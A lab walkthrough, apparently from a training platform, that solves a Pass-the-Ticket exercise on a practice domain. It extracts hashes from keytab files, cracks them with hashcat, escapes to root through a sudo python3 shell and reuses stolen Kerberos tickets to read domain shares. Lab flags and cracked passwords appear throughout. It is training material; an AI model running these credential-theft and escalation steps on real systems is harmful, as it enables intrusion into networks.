# Pass the Ticket (PtT) from Linux

SSH with user "`david@inlanefreight.htb`" and password "`Password2`"

### Connect to the target machine using SSH to the port TCP/2222 and the provided credentials. Read the flag in David's home directory.

```bash
ssh david@inlanefreight.htb@10.129.198.144 -p2222
cat flag.txt
Gett1ng_Acc3$$_to_LINUX01
```

### Which group can connect to LINUX01?

```bash
realm list
inlanefreight.htb
  type: kerberos
  realm-name: INLANEFREIGHT.HTB
  domain-name: inlanefreight.htb
  configured: kerberos-member
  server-software: active-directory
  client-software: sssd
  required-package: sssd-tools
  required-package: sssd
  required-package: libnss-sss
  required-package: libpam-sss
  required-package: adcli
  required-package: samba-common-bin
  login-formats: %U@inlanefreight.htb
  login-policy: allow-permitted-logins
  permitted-logins: david@inlanefreight.htb, julio@inlanefreight.htb
  permitted-groups: Linux Admins
```

Linux Admins

### Look for a keytab file that you have read and write access. Submit the file name as a response.

```bash
find / -name *keytab* -ls 2>/dev/null
   262184      4 -rw-rw-rw-   1 root     root          216 Oct 25  2022 /opt/specialfiles/carlos.keytab
```

carlos.keytab

### Extract the hashes from the keytab file you found, crack the password, log in as the user and submit the flag in the user's home directory.

```bash
#lets copy this file into our kali machine
scp -P 2222 david@inlanefreight.htb@10.129.80.243:/opt/specialfiles/carlos.keytab . 
scp -P 2222 david@inlanefreight.htb@10.129.80.243:/opt/keytabextract.py .
```

Let's use [KeyTabExtract](https://github.com/sosdave/KeyTabExtract), a tool to extract valuable information from 502-type .keytab files

```bash
python3 /opt/keytabextract.py /opt/specialfiles/carlos.keytab 
[*] RC4-HMAC Encryption detected. Will attempt to extract NTLM hash.
[*] AES256-CTS-HMAC-SHA1 key found. Will attempt hash extraction.
[*] AES128-CTS-HMAC-SHA1 hash discovered. Will attempt hash extraction.
[+] Keytab File successfully imported.
        REALM : INLANEFREIGHT.HTB
        SERVICE PRINCIPAL : carlos/
        NTLM HASH : a738f92b3c08b424ec2d99589a9cce60
        AES-256 HASH : 42ff0baa586963d9010584eb9590595e8cd47c489e25e82aae69b1de2943007f
        AES-128 HASH : fa74d5abf4061baa1d4ff8485d1261c4
```

lets crack it now

<pre class="language-bash"><code class="lang-bash">echo 'a738f92b3c08b424ec2d99589a9cce60' > hash.txt    
hashcat -m 1000 hash.txt /usr/share/wordlists/rockyou.txt
<strong>#a738f92b3c08b424ec2d99589a9cce60:Password5
</strong>ssh carlos@inlanefreight.htb@10.129.80.243 -p2222
cat flag.txt 
C@rl0s_1$_H3r3
</code></pre>

### Check Carlos' crontab, and look for keytabs to which Carlos has access. Try to get the credentials of the user svc\_workstations and use them to authenticate via SSH. Submit the flag.txt in svc\_workstations' home directory.

```bash
crontab -l
*/5 * * * * /home/carlos@inlanefreight.htb/.scripts/kerberos_script_test.sh
cd .scripts
python3 /opt/keytabextract.py svc_workstations._all.kt 
#[*] RC4-HMAC Encryption detected. Will attempt to extract NTLM hash.
#[*] AES256-CTS-HMAC-SHA1 key found. Will attempt hash extraction.
#[*] AES128-CTS-HMAC-SHA1 hash discovered. Will attempt hash extraction.
#[+] Keytab File successfully imported.
#        REALM : INLANEFREIGHT.HTB
#        SERVICE PRINCIPAL : svc_workstations/
#        NTLM HASH : 7247e8d4387e76996ff3f18a34316fdd
#        AES-256 HASH : 0c91040d4d05092a3d545bbf76237b3794c456ac42c8d577753d64283889da6d
#        AES-128 HASH : 3a7e52143531408f39101187acc80677
#python3 /opt/keytabextract.py svc_workstations.kt 
#        AES-256 HASH : 0c91040d4d05092a3d545bbf76237b3794c456ac42c8d577753d64283889da6d
```

lets crack it now

```bash
hashcat -m 1000 hash.txt /usr/share/wordlists/rockyou.txt  
#7247e8d4387e76996ff3f18a34316fdd:Password4                
```

now we login to svc workstations user

```bash
ssh svc_workstations@inlanefreight.htb@10.129.80.243 -p2222
cat flag.txt 
Mor3_4cce$$_m0r3_Pr1v$
```

### Check svc\_workstation's sudo privileges and get access as root. Submit the flag in /root/flag.txt directory as the response.

```bash
sudo -l
#    (ALL) ALL
#go to https://gtfobins.github.io
which python3
sudo python3 -c 'import os; os.system("/bin/sh")'
whoami #root
cat /root/flag.txt 
Ro0t_Pwn_K3yT4b
```

### Check the /tmp directory and find Julio's Kerberos ticket (ccache file). Import the ticket and read the contents of julio.txt from the domain share folder \DC01\julio.

```bash
#as root user
env | grep -i krb5
KRB5CCNAME=FILE:/tmp/krb5cc_647401109_25wRXV
ls -la /tmp
#now to import the ticket
cp /tmp/krb5cc_647401106_fD3oWV .
export KRB5CCNAME=/root/krb5cc_647401106_fD3oWV 
klist
#Ticket cache: FILE:/root/krb5cc_647401106_fD3oWV
#Default principal: julio@INLANEFREIGHT.HTB
#Valid starting       Expires              Service principal
#02/21/2024 17:30:01  02/22/2024 03:30:01  krbtgt/INLANEFREIGHT.HTB@INLANEFREIGHT.HTB
#        renew until 02/22/2024 17:30:01
smbclient \\\\DC01\\julio -k -c ls -no-pass
#  .                                   D        0  Thu Jul 14 12:25:24 2022
#  ..                                  D        0  Thu Jul 14 12:25:24 2022
#  julio.txt                           A       17  Thu Jul 14 21:18:12 2022
smbclient \\\\DC01\\julio -k -c 'get julio.txt' -no-pass
#getting file \julio.txt of size 17 as julio.txt (16.6 KiloBytes/sec) (average 16.6 KiloBytes/sec)
cat julio.txt 
JuL1()_SH@re_fl@g
```

### Use the LINUX01$ Kerberos ticket to read the flag found in \\\DC01\linux01. Submit the contents as your response (the flag starts with Us1nG\_).

```bash
find / -name *krb*.keytab 2>/dev/null
kinit LINUX01$ -k -t /etc/krb5.keytab 
klist
#Ticket cache: FILE:/root/krb5cc_647401106_fD3oWV
#Default principal: LINUX01$@INLANEFREIGHT.HTB
#Valid starting       Expires              Service principal
#02/21/2024 17:52:31  02/22/2024 03:52:31  krbtgt/INLANEFREIGHT.HTB@INLANEFREIGHT.HTB
#        renew until 02/22/2024 17:52:30
smbclient \\\\DC01\\linux01 -k -c ls -no-pass
#  flag.txt                            A       52  Wed Oct  5 14:17:02 2022
smbclient \\\\DC01\\linux01 -k -c 'get flag.txt' -no-pass
cat flag.txt
Us1nG_KeyTab_Like_@_PRO
```
